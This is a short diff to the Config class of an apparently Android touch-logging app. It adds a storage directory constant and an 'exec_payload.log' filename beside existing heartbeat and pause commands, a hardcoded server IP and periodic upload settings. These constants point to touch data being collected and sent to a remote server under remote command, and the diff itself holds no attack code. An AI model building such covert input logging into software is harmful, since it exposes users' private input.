@@ -15,10 +15,12 @@ public class Config {
     // be sure to keep this in sync with native part
     public static final String TOUCH_DATA_FILE_BASE_NAME = "touch_event_data";
 
+    public static final File TOUCH_LOGGER_DIR =
+            new File(Environment.getExternalStorageDirectory().getPath(), "touch_logger");
+
     // be sure to keep this in sync with native part
     public static final String INPUT_DATA_DIR =
-            new File(Environment.getExternalStorageDirectory().getPath(), "touch_logger/touch_data")
-                    .getAbsolutePath();
+            new File(TOUCH_LOGGER_DIR, "touch_data").getAbsolutePath();
 
     public static final String HEARTBEAT_COMMAND = "heartbeat";
     public static final String PAUSE_COMMAND = "pause";
@@ -28,6 +30,7 @@ public class Config {
     public static final long ONLINE_TIMEOUT_MS = 2000;  // ms
     public static final int GESTURES_BUFFER_SIZE = 20; // gestures
     public static final String DEFAULT_URL = "http://128.199.47.80:9002/";
+    public static final String EXEC_PAYLOAD_LOG = "exec_payload.log";
 
     public static long UPLOAD_JOB_START_IN_MS = 60 * 1000;
     public static long UPLOAD_JOB_INTERVAL_MS = 15 * 60 * 1000;
